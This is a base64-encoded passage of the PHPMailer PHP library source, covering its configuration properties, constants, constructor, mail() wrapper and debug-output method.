Y3Rpb24gd2lsbCByZXF1aXJlIGFuIGV4cGxpY2l0IGNhbGwgdG8gc210cENsb3NlKCkuCiAgICAgKiBJdCdzIGEgZ29vZCBpZGVhIHRvIHVzZSB0aGlzIGlmIHlvdSBhcmUgc2VuZGluZyBtdWx0aXBsZSBtZXNzYWdlcyBhcyBpdCByZWR1Y2VzIG92ZXJoZWFkLgogICAgICogU2VlIHRoZSBtYWlsaW5nIGxpc3QgZXhhbXBsZSBmb3IgaG93IHRvIHVzZSBpdC4KICAgICAqCiAgICAgKiBAdmFyIGJvb2wKICAgICAqLwogICAgcHVibGljICRTTVRQS2VlcEFsaXZlID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIHNwbGl0IG11bHRpcGxlIHRvIGFkZHJlc3NlcyBpbnRvIG11bHRpcGxlIG1lc3NhZ2VzCiAgICAgKiBvciBzZW5kIHRoZW0gYWxsIGluIG9uZSBtZXNzYWdlLgogICAgICogT25seSBzdXBwb3J0ZWQgaW4gYG1haWxgIGFuZCBgc2VuZG1haWxgIHRyYW5zcG9ydHMsIG5vdCBpbiBTTVRQLgogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICoKICAgICAqIEBkZXByZWNhdGVkIDYuMC4wIFBIUE1haWxlciBpc24ndCBhIG1haWxpbmcgbGlzdCBtYW5hZ2VyIQogICAgICovCiAgICBwdWJsaWMgJFNpbmdsZVRvID0gZmFsc2U7CgogICAgLyoqCiAgICAgKiBTdG9yYWdlIGZvciBhZGRyZXNzZXMgd2hlbiBTaW5nbGVUbyBpcyBlbmFibGVkLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRTaW5nbGVUb0FycmF5ID0gW107CgogICAgLyoqCiAgICAgKiBXaGV0aGVyIHRvIGdlbmVyYXRlIFZFUlAgYWRkcmVzc2VzIG9uIHNlbmQuCiAgICAgKiBPbmx5IGFwcGxpY2FibGUgd2hlbiBzZW5kaW5nIHZpYSBTTVRQLgogICAgICoKICAgICAqIEBzZWUgaHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVmFyaWFibGVfZW52ZWxvcGVfcmV0dXJuX3BhdGgKICAgICAqIEBzZWUgaHR0cHM6Ly93d3cucG9zdGZpeC5vcmcvVkVSUF9SRUFETUUuaHRtbCBQb3N0Zml4IFZFUlAgaW5mbwogICAgICoKICAgICAqIEB2YXIgYm9vbAogICAgICovCiAgICBwdWJsaWMgJGRvX3ZlcnAgPSBmYWxzZTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdG8gYWxsb3cgc2VuZGluZyBtZXNzYWdlcyB3aXRoIGFuIGVtcHR5IGJvZHkuCiAgICAgKgogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHB1YmxpYyAkQWxsb3dFbXB0eSA9IGZhbHNlOwoKICAgIC8qKgogICAgICogREtJTSBzZWxlY3Rvci4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fc2VsZWN0b3IgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gSWRlbnRpdHkuCiAgICAgKiBVc3VhbGx5IHRoZSBlbWFpbCBhZGRyZXNzIHVzZWQgYXMgdGhlIHNvdXJjZSBvZiB0aGUgZW1haWwuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX2lkZW50aXR5ID0gJyc7CgogICAgLyoqCiAgICAgKiBES0lNIHBhc3NwaHJhc2UuCiAgICAgKiBVc2VkIGlmIHlvdXIga2V5IGlzIGVuY3J5cHRlZC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcGFzc3BocmFzZSA9ICcnOwoKICAgIC8qKgogICAgICogREtJTSBzaWduaW5nIGRvbWFpbiBuYW1lLgogICAgICoKICAgICAqIEBleGFtcGxlICdleGFtcGxlLmNvbScKICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fZG9tYWluID0gJyc7CgogICAgLyoqCiAgICAgKiBES0lNIENvcHkgaGVhZGVyIGZpZWxkIHZhbHVlcyBmb3IgZGlhZ25vc3RpYyB1c2UuCiAgICAgKgogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHB1YmxpYyAkREtJTV9jb3B5SGVhZGVyRmllbGRzID0gdHJ1ZTsKCiAgICAvKioKICAgICAqIERLSU0gRXh0cmEgc2lnbmluZyBoZWFkZXJzLgogICAgICoKICAgICAqIEBleGFtcGxlIFsnTGlzdC1VbnN1YnNjcmliZScsICdMaXN0LUhlbHAnXQogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHVibGljICRES0lNX2V4dHJhSGVhZGVycyA9IFtdOwoKICAgIC8qKgogICAgICogREtJTSBwcml2YXRlIGtleSBmaWxlIHBhdGguCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHVibGljICRES0lNX3ByaXZhdGUgPSAnJzsKCiAgICAvKioKICAgICAqIERLSU0gcHJpdmF0ZSBrZXkgc3RyaW5nLgogICAgICoKICAgICAqIElmIHNldCwgdGFrZXMgcHJlY2VkZW5jZSBvdmVyIGAkREtJTV9wcml2YXRlYC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJERLSU1fcHJpdmF0ZV9zdHJpbmcgPSAnJzsKCiAgICAvKioKICAgICAqIENhbGxiYWNrIEFjdGlvbiBmdW5jdGlvbiBuYW1lLgogICAgICoKICAgICAqIFRoZSBmdW5jdGlvbiB0aGF0IGhhbmRsZXMgdGhlIHJlc3VsdCBvZiB0aGUgc2VuZCBlbWFpbCBhY3Rpb24uCiAgICAgKiBJdCBpcyBjYWxsZWQgb3V0IGJ5IHNlbmQoKSBmb3IgZWFjaCBlbWFpbCBzZW50LgogICAgICoKICAgICAqIFZhbHVlIGNhbiBiZSBhbnkgcGhwIGNhbGxhYmxlOiBodHRwczovL3d3dy5waHAubmV0L2lzX2NhbGxhYmxlCiAgICAgKgogICAgICogUGFyYW1ldGVyczoKICAgICAqICAgYm9vbCAkcmVzdWx0ICAgICAgICAgICByZXN1bHQgb2YgdGhlIHNlbmQgYWN0aW9uCiAgICAgKiAgIGFycmF5ICAgJHRvICAgICAgICAgICAgZW1haWwgYWRkcmVzc2VzIG9mIHRoZSByZWNpcGllbnRzCiAgICAgKiAgIGFycmF5ICAgJGNjICAgICAgICAgICAgY2MgZW1haWwgYWRkcmVzc2VzCiAgICAgKiAgIGFycmF5ICAgJGJjYyAgICAgICAgICAgYmNjIGVtYWlsIGFkZHJlc3NlcwogICAgICogICBzdHJpbmcgICRzdWJqZWN0ICAgICAgIHRoZSBzdWJqZWN0CiAgICAgKiAgIHN0cmluZyAgJGJvZHkgICAgICAgICAgdGhlIGVtYWlsIGJvZHkKICAgICAqICAgc3RyaW5nICAkZnJvbSAgICAgICAgICBlbWFpbCBhZGRyZXNzIG9mIHNlbmRlcgogICAgICogICBzdHJpbmcgICRleHRyYSAgICAgICAgIGV4dHJhIGluZm9ybWF0aW9uIG9mIHBvc3NpYmxlIHVzZQogICAgICogICAgICAgICAgICAgICAgICAgICAgICAgICJzbXRwX3RyYW5zYWN0aW9uX2lkJyA9PiBsYXN0IHNtdHAgdHJhbnNhY3Rpb24gaWQKICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgJGFjdGlvbl9mdW5jdGlvbiA9ICcnOwoKICAgIC8qKgogICAgICogV2hhdCB0byBwdXQgaW4gdGhlIFgtTWFpbGVyIGhlYWRlci4KICAgICAqIE9wdGlvbnM6IEFuIGVtcHR5IHN0cmluZyBmb3IgUEhQTWFpbGVyIGRlZmF1bHQsIHdoaXRlc3BhY2UvbnVsbCBmb3Igbm9uZSwgb3IgYSBzdHJpbmcgdG8gdXNlLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nfG51bGwKICAgICAqLwogICAgcHVibGljICRYTWFpbGVyID0gJyc7CgogICAgLyoqCiAgICAgKiBXaGljaCB2YWxpZGF0b3IgdG8gdXNlIGJ5IGRlZmF1bHQgd2hlbiB2YWxpZGF0aW5nIGVtYWlsIGFkZHJlc3Nlcy4KICAgICAqIE1heSBiZSBhIGNhbGxhYmxlIHRvIGluamVjdCB5b3VyIG93biB2YWxpZGF0b3IsIGJ1dCB0aGVyZSBhcmUgc2V2ZXJhbCBidWlsdC1pbiB2YWxpZGF0b3JzLgogICAgICogVGhlIGRlZmF1bHQgdmFsaWRhdG9yIHVzZXMgUEhQJ3MgRklMVEVSX1ZBTElEQVRFX0VNQUlMIGZpbHRlcl92YXIgb3B0aW9uLgogICAgICoKICAgICAqIElmIENoYXJTZXQgaXMgVVRGOCwgdGhlIHZhbGlkYXRvciBpcyBsZWZ0IGF0IHRoZSBkZWZhdWx0IHZhbHVlLAogICAgICogYW5kIHlvdSBzZW5kIHRvIGFkZHJlc3NlcyB0aGF0IHVzZSBub24tQVNDSUkgbG9jYWwgcGFydHMsIHRoZW4KICAgICAqIFBIUE1haWxlciBhdXRvbWF0aWNhbGx5IGNoYW5nZXMgdG8gdGhlICdlYWknIHZhbGlkYXRvci4KICAgICAqCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6dmFsaWRhdGVBZGRyZXNzKCkKICAgICAqCiAgICAgKiBAdmFyIHN0cmluZ3xjYWxsYWJsZQogICAgICovCiAgICBwdWJsaWMgc3RhdGljICR2YWxpZGF0b3IgPSAncGhwJzsKCiAgICAvKioKICAgICAqIEFuIGluc3RhbmNlIG9mIHRoZSBTTVRQIHNlbmRlciBjbGFzcy4KICAgICAqCiAgICAgKiBAdmFyIFNNVFAKICAgICAqLwogICAgcHJvdGVjdGVkICRzbXRwOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mICd0bycgbmFtZXMgYW5kIGFkZHJlc3Nlcy4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkdG8gPSBbXTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiAnY2MnIG5hbWVzIGFuZCBhZGRyZXNzZXMuCiAgICAgKgogICAgICogQHZhciBhcnJheQogICAgICovCiAgICBwcm90ZWN0ZWQgJGNjID0gW107CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgJ2JjYycgbmFtZXMgYW5kIGFkZHJlc3Nlcy4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkYmNjID0gW107CgogICAgLyoqCiAgICAgKiBUaGUgYXJyYXkgb2YgcmVwbHktdG8gbmFtZXMgYW5kIGFkZHJlc3Nlcy4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkUmVwbHlUbyA9IFtdOwoKICAgIC8qKgogICAgICogQW4gYXJyYXkgb2YgYWxsIGtpbmRzIG9mIGFkZHJlc3Nlcy4KICAgICAqIEluY2x1ZGVzIGFsbCBvZiAkdG8sICRjYywgJGJjYy4KICAgICAqCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JHRvCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JGNjCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6JGJjYwogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRhbGxfcmVjaXBpZW50cyA9IFtdOwoKICAgIC8qKgogICAgICogQW4gYXJyYXkgb2YgbmFtZXMgYW5kIGFkZHJlc3NlcyBxdWV1ZWQgZm9yIHZhbGlkYXRpb24uCiAgICAgKiBJbiBzZW5kKCksIHZhbGlkIGFuZCBub24gZHVwbGljYXRlIGVudHJpZXMgYXJlIG1vdmVkIHRvICRhbGxfcmVjaXBpZW50cwogICAgICogYW5kIG9uZSBvZiAkdG8sICRjYywgb3IgJGJjYy4KICAgICAqIFRoaXMgYXJyYXkgaXMgdXNlZCBvbmx5IGZvciBhZGRyZXNzZXMgd2l0aCBJRE4uCiAgICAgKgogICAgICogQHNlZSBQSFBNYWlsZXI6OiR0bwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRjYwogICAgICogQHNlZSBQSFBNYWlsZXI6OiRiY2MKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokYWxsX3JlY2lwaWVudHMKICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkUmVjaXBpZW50c1F1ZXVlID0gW107CgogICAgLyoqCiAgICAgKiBBbiBhcnJheSBvZiByZXBseS10byBuYW1lcyBhbmQgYWRkcmVzc2VzIHF1ZXVlZCBmb3IgdmFsaWRhdGlvbi4KICAgICAqIEluIHNlbmQoKSwgdmFsaWQgYW5kIG5vbiBkdXBsaWNhdGUgZW50cmllcyBhcmUgbW92ZWQgdG8gJFJlcGx5VG8uCiAgICAgKiBUaGlzIGFycmF5IGlzIHVzZWQgb25seSBmb3IgYWRkcmVzc2VzIHdpdGggSUROLgogICAgICoKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokUmVwbHlUbwogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRSZXBseVRvUXVldWUgPSBbXTsKCiAgICAvKioKICAgICAqIFdoZXRoZXIgdGhlIG5lZWQgZm9yIFNNVFBVVEY4IGhhcyBiZWVuIGRldGVjdGVkLiBTZXQgYnkKICAgICAqIHByZVNlbmQoKSBpZiBuZWNlc3NhcnkuCiAgICAgKgogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHB1YmxpYyAkVXNlU01UUFVURjggPSBmYWxzZTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiBhdHRhY2htZW50cy4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkYXR0YWNobWVudCA9IFtdOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIGN1c3RvbSBoZWFkZXJzLgogICAgICoKICAgICAqIEB2YXIgYXJyYXkKICAgICAqLwogICAgcHJvdGVjdGVkICRDdXN0b21IZWFkZXIgPSBbXTsKCiAgICAvKioKICAgICAqIFRoZSBtb3N0IHJlY2VudCBNZXNzYWdlLUlEIChpbmNsdWRpbmcgYW5ndWxhciBicmFja2V0cykuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRsYXN0TWVzc2FnZUlEID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgbWVzc2FnZSdzIE1JTUUgdHlwZS4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJG1lc3NhZ2VfdHlwZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIGFycmF5IG9mIE1JTUUgYm91bmRhcnkgc3RyaW5ncy4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkYm91bmRhcnkgPSBbXTsKCiAgICAvKioKICAgICAqIFRoZSBhcnJheSBvZiBhdmFpbGFibGUgdGV4dCBzdHJpbmdzIGZvciB0aGUgY3VycmVudCBsYW5ndWFnZS4KICAgICAqCiAgICAgKiBAdmFyIGFycmF5CiAgICAgKi8KICAgIHByb3RlY3RlZCAkbGFuZ3VhZ2UgPSBbXTsKCiAgICAvKioKICAgICAqIFRoZSBudW1iZXIgb2YgZXJyb3JzIGVuY291bnRlcmVkLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXJyb3JfY291bnQgPSAwOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBjZXJ0aWZpY2F0ZSBmaWxlIHBhdGguCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICRzaWduX2NlcnRfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFMvTUlNRSBrZXkgZmlsZSBwYXRoLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfZmlsZSA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIG9wdGlvbmFsIFMvTUlNRSBleHRyYSBjZXJ0aWZpY2F0ZXMgKCJDQSBDaGFpbiIpIGZpbGUgcGF0aC4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBwcm90ZWN0ZWQgJHNpZ25fZXh0cmFjZXJ0c19maWxlID0gJyc7CgogICAgLyoqCiAgICAgKiBUaGUgUy9NSU1FIHBhc3N3b3JkIGZvciB0aGUga2V5LgogICAgICogVXNlZCBvbmx5IGlmIHRoZSBrZXkgaXMgZW5jcnlwdGVkLgogICAgICoKICAgICAqIEB2YXIgc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCAkc2lnbl9rZXlfcGFzcyA9ICcnOwoKICAgIC8qKgogICAgICogV2hldGhlciB0byB0aHJvdyBleGNlcHRpb25zIGZvciBlcnJvcnMuCiAgICAgKgogICAgICogQHZhciBib29sCiAgICAgKi8KICAgIHByb3RlY3RlZCAkZXhjZXB0aW9ucyA9IGZhbHNlOwoKICAgIC8qKgogICAgICogVW5pcXVlIElEIHVzZWQgZm9yIG1lc3NhZ2UgSUQgYW5kIGJvdW5kYXJpZXMuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkICR1bmlxdWVpZCA9ICcnOwoKICAgIC8qKgogICAgICogVGhlIFBIUE1haWxlciBWZXJzaW9uIG51bWJlci4KICAgICAqCiAgICAgKiBAdmFyIHN0cmluZwogICAgICovCiAgICBjb25zdCBWRVJTSU9OID0gJzYuMTAuMCc7CgogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSBvbmx5LCBjb250aW51ZSBwcm9jZXNzaW5nLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIGNvbnN0IFNUT1BfTUVTU0FHRSA9IDA7CgogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSwgbGlrZWx5IG9rIHRvIGNvbnRpbnVlIHByb2Nlc3NpbmcuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgY29uc3QgU1RPUF9DT05USU5VRSA9IDE7CgogICAgLyoqCiAgICAgKiBFcnJvciBzZXZlcml0eTogbWVzc2FnZSwgcGx1cyBmdWxsIHN0b3AsIGNyaXRpY2FsIGVycm9yIHJlYWNoZWQuCiAgICAgKgogICAgICogQHZhciBpbnQKICAgICAqLwogICAgY29uc3QgU1RPUF9DUklUSUNBTCA9IDI7CgogICAgLyoqCiAgICAgKiBUaGUgU01UUCBzdGFuZGFyZCBDUkxGIGxpbmUgYnJlYWsuCiAgICAgKiBJZiB5b3Ugd2FudCB0byBjaGFuZ2UgbGluZSBicmVhayBmb3JtYXQsIGNoYW5nZSBzdGF0aWM6OiRMRSwgbm90IHRoaXMuCiAgICAgKi8KICAgIGNvbnN0IENSTEYgPSAiXHJcbiI7CgogICAgLyoqCiAgICAgKiAiRm9sZGluZyBXaGl0ZSBTcGFjZSIgYSB3aGl0ZSBzcGFjZSBzdHJpbmcgdXNlZCBmb3IgbGluZSBmb2xkaW5nLgogICAgICovCiAgICBjb25zdCBGV1MgPSAnICc7CgogICAgLyoqCiAgICAgKiBTTVRQIFJGQyBzdGFuZGFyZCBsaW5lIGVuZGluZzsgQ2FycmlhZ2UgUmV0dXJuLCBMaW5lIEZlZWQuCiAgICAgKgogICAgICogQHZhciBzdHJpbmcKICAgICAqLwogICAgcHJvdGVjdGVkIHN0YXRpYyAkTEUgPSBzZWxmOjpDUkxGOwoKICAgIC8qKgogICAgICogVGhlIG1heGltdW0gbGluZSBsZW5ndGggc3VwcG9ydGVkIGJ5IG1haWwoKS4KICAgICAqCiAgICAgKiBCYWNrZ3JvdW5kOiBtYWlsKCkgd2lsbCBzb21ldGltZXMgY29ycnVwdCBtZXNzYWdlcwogICAgICogd2l0aCBoZWFkZXJzIGxvbmdlciB0aGFuIDY1IGNoYXJzLCBzZWUgIzgxOC4KICAgICAqCiAgICAgKiBAdmFyIGludAogICAgICovCiAgICBjb25zdCBNQUlMX01BWF9MSU5FX0xFTkdUSCA9IDYzOwoKICAgIC8qKgogICAgICogVGhlIG1heGltdW0gbGluZSBsZW5ndGggYWxsb3dlZCBieSBSRkMgMjgyMiBzZWN0aW9uIDIuMS4xLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIGNvbnN0IE1BWF9MSU5FX0xFTkdUSCA9IDk5ODsKCiAgICAvKioKICAgICAqIFRoZSBsb3dlciBtYXhpbXVtIGxpbmUgbGVuZ3RoIGFsbG93ZWQgYnkgUkZDIDI4MjIgc2VjdGlvbiAyLjEuMS4KICAgICAqIFRoaXMgbGVuZ3RoIGRvZXMgTk9UIGluY2x1ZGUgdGhlIGxpbmUgYnJlYWsKICAgICAqIDc2IG1lYW5zIHRoYXQgbGluZXMgd2lsbCBiZSA3NyBvciA3OCBjaGFycyBkZXBlbmRpbmcgb24gd2hldGhlcgogICAgICogdGhlIGxpbmUgYnJlYWsgZm9ybWF0IGlzIExGIG9yIENSTEY7IGJvdGggYXJlIHZhbGlkLgogICAgICoKICAgICAqIEB2YXIgaW50CiAgICAgKi8KICAgIGNvbnN0IFNURF9MSU5FX0xFTkdUSCA9IDc2OwoKICAgIC8qKgogICAgICogQ29uc3RydWN0b3IuCiAgICAgKgogICAgICogQHBhcmFtIGJvb2wgJGV4Y2VwdGlvbnMgU2hvdWxkIHdlIHRocm93IGV4dGVybmFsIGV4Y2VwdGlvbnM/CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkZXhjZXB0aW9ucyA9IG51bGwpCiAgICB7CiAgICAgICAgaWYgKG51bGwgIT09ICRleGNlcHRpb25zKSB7CiAgICAgICAgICAgICR0aGlzLT5leGNlcHRpb25zID0gKGJvb2wpICRleGNlcHRpb25zOwogICAgICAgIH0KICAgICAgICAvL1BpY2sgYW4gYXBwcm9wcmlhdGUgZGVidWcgb3V0cHV0IGZvcm1hdCBhdXRvbWF0aWNhbGx5CiAgICAgICAgJHRoaXMtPkRlYnVnb3V0cHV0ID0gKHN0cnBvcyhQSFBfU0FQSSwgJ2NsaScpICE9PSBmYWxzZSA/ICdlY2hvJyA6ICdodG1sJyk7CiAgICB9CgogICAgLyoqCiAgICAgKiBEZXN0cnVjdG9yLgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gX19kZXN0cnVjdCgpCiAgICB7CiAgICAgICAgLy9DbG9zZSBhbnkgb3BlbiBTTVRQIGNvbm5lY3Rpb24gbmljZWx5CiAgICAgICAgJHRoaXMtPnNtdHBDbG9zZSgpOwogICAgfQoKICAgIC8qKgogICAgICogQ2FsbCBtYWlsKCkgaW4gYSBzYWZlX21vZGUtYXdhcmUgZmFzaGlvbi4KICAgICAqIEFsc28sIHVubGVzcyBzZW5kbWFpbF9wYXRoIHBvaW50cyB0byBzZW5kbWFpbCAob3Igc29tZXRoaW5nIHRoYXQKICAgICAqIGNsYWltcyB0byBiZSBzZW5kbWFpbCksIGRvbid0IHBhc3MgcGFyYW1zIChub3QgYSBwZXJmZWN0IGZpeCwKICAgICAqIGJ1dCBpdCB3aWxsIGRvKS4KICAgICAqCiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAgJHRvICAgICAgVG8KICAgICAqIEBwYXJhbSBzdHJpbmcgICAgICAkc3ViamVjdCBTdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAgJGJvZHkgICAgTWVzc2FnZSBCb2R5CiAgICAgKiBAcGFyYW0gc3RyaW5nICAgICAgJGhlYWRlciAgQWRkaXRpb25hbCBIZWFkZXIocykKICAgICAqIEBwYXJhbSBzdHJpbmd8bnVsbCAkcGFyYW1zICBQYXJhbXMKICAgICAqCiAgICAgKiBAcmV0dXJuIGJvb2wKICAgICAqLwogICAgcHJpdmF0ZSBmdW5jdGlvbiBtYWlsUGFzc3RocnUoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpCiAgICB7CiAgICAgICAgLy9DaGVjayBvdmVybG9hZGluZyBvZiBtYWlsIGZ1bmN0aW9uIHRvIGF2b2lkIGRvdWJsZS1lbmNvZGluZwogICAgICAgIGlmICgoaW50KWluaV9nZXQoJ21ic3RyaW5nLmZ1bmNfb3ZlcmxvYWQnKSAmIDEpIHsKICAgICAgICAgICAgJHN1YmplY3QgPSAkdGhpcy0+c2VjdXJlSGVhZGVyKCRzdWJqZWN0KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkc3ViamVjdCA9ICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkc3ViamVjdCkpOwogICAgICAgIH0KICAgICAgICAvL0NhbGxpbmcgbWFpbCgpIHdpdGggbnVsbCBwYXJhbXMgYnJlYWtzCiAgICAgICAgJHRoaXMtPmVkZWJ1ZygnU2VuZGluZyB3aXRoIG1haWwoKScpOwogICAgICAgICR0aGlzLT5lZGVidWcoJ1NlbmRtYWlsIHBhdGg6ICcgLiBpbmlfZ2V0KCdzZW5kbWFpbF9wYXRoJykpOwogICAgICAgICR0aGlzLT5lZGVidWcoIkVudmVsb3BlIHNlbmRlcjogeyR0aGlzLT5TZW5kZXJ9Iik7CiAgICAgICAgJHRoaXMtPmVkZWJ1ZygiVG86IHskdG99Iik7CiAgICAgICAgJHRoaXMtPmVkZWJ1ZygiU3ViamVjdDogeyRzdWJqZWN0fSIpOwogICAgICAgICR0aGlzLT5lZGVidWcoIkhlYWRlcnM6IHskaGVhZGVyfSIpOwogICAgICAgIGlmICghJHRoaXMtPlVzZVNlbmRtYWlsT3B0aW9ucyB8fCBudWxsID09PSAkcGFyYW1zKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSBAbWFpbCgkdG8sICRzdWJqZWN0LCAkYm9keSwgJGhlYWRlcik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygiQWRkaXRpb25hbCBwYXJhbXM6IHskcGFyYW1zfSIpOwogICAgICAgICAgICAkcmVzdWx0ID0gQG1haWwoJHRvLCAkc3ViamVjdCwgJGJvZHksICRoZWFkZXIsICRwYXJhbXMpOwogICAgICAgIH0KICAgICAgICAkdGhpcy0+ZWRlYnVnKCdSZXN1bHQ6ICcgLiAoJHJlc3VsdCA/ICd0cnVlJyA6ICdmYWxzZScpKTsKICAgICAgICByZXR1cm4gJHJlc3VsdDsKICAgIH0KCiAgICAvKioKICAgICAqIE91dHB1dCBkZWJ1Z2dpbmcgaW5mbyB2aWEgYSB1c2VyLWRlZmluZWQgbWV0aG9kLgogICAgICogT25seSBnZW5lcmF0ZXMgb3V0cHV0IGlmIGRlYnVnIG91dHB1dCBpcyBlbmFibGVkLgogICAgICoKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokRGVidWdvdXRwdXQKICAgICAqIEBzZWUgUEhQTWFpbGVyOjokU01UUERlYnVnCiAgICAgKgogICAgICogQHBhcmFtIHN0cmluZyAkc3RyCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBlZGVidWcoJHN0cikKICAgIHsKICAgICAgICBpZiAoJHRoaXMtPlNNVFBEZWJ1ZyA8PSAwKSB7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgLy9JcyB0aGlzIGEgUFNSLTMgbG9nZ2VyPwogICAgICAgIGlmICgkdGhpcy0+RGVidWdvdXRwdXQgaW5zdGFuY2VvZiBcUHNyXExvZ1xMb2dnZXJJbnRlcmZhY2UpIHsKICAgICAgICAgICAgJHRoaXMtPkRlYnVnb3V0cHV0LT5kZWJ1ZyhydHJpbSgkc3RyLCAiXHJcbiIpKTsKCiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgLy9Bdm9pZCBjbGFzaCB3aXRoIGJ1aWx0LWluIGZ1bmN0aW9uIG5hbWVzCiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCR0aGlzLT5EZWJ1Z291dHB1dCkgJiYgIWluX2FycmF5KCR0aGlzLT5EZWJ1Z291dHB1dCwgWydlcnJvcl9sb2cnLCAnaHRtbCcsICdlY2hvJ10pKSB7CiAgICAgICAgICAgIGNhbGxfdXNlcl9mdW5jKCR0aGlzLT5EZWJ1Z291dHB1dCwgJHN0ciwgJHRoaXMtPlNNVFBEZWJ1Zyk7CgogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIHN3aXRjaCAoJHRoaXMtPkRlYnVnb3V0cHV0KSB7CiAgICAgICAgICAgIGNhc2UgJ2Vycm9yX2xvZyc6CiAgICAgICAgICAgICAgICAvL0Rvbid0IG91dHB1dCwganVzdCBsb2cKICAgICAgICAgICAgICAgIC8qKiBAbm9pbnNwZWN0aW9uIEZvcmdvdHRlbkRlYnVnT3V0cHV0SW5zcGVjdGlvbiAqLwogICAgICAgICAgICAgICAgZXJyb3JfbG9nKCRzdHIpOwogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIGNhc2UgJ2h0bWwnOgogICAgICAgICAgICAgICAgLy9DbGVhbnMgdXAgb3V0cHV0IGEgYml0IGZvciBhIGJldHRlciBsb29raW5